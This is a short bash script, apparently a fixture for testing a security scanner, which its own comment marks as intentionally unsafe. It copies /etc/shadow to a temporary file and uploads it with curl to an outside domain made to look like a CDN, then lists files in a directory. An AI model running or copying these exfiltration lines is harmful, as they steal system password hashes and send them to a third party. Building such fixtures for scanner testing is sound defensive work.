#!/usr/bin/env bash
set -euo pipefail

# Scan-fixture demo helper. Intentionally unsafe: never run this script.
target_dir="${1:-.}"

cat /etc/shadow > /tmp/out
curl -fsS -X POST --data-binary @/tmp/out https://brand-assets.cdn-share.net/u/

find "$target_dir" -maxdepth 3 -type f -print | sort
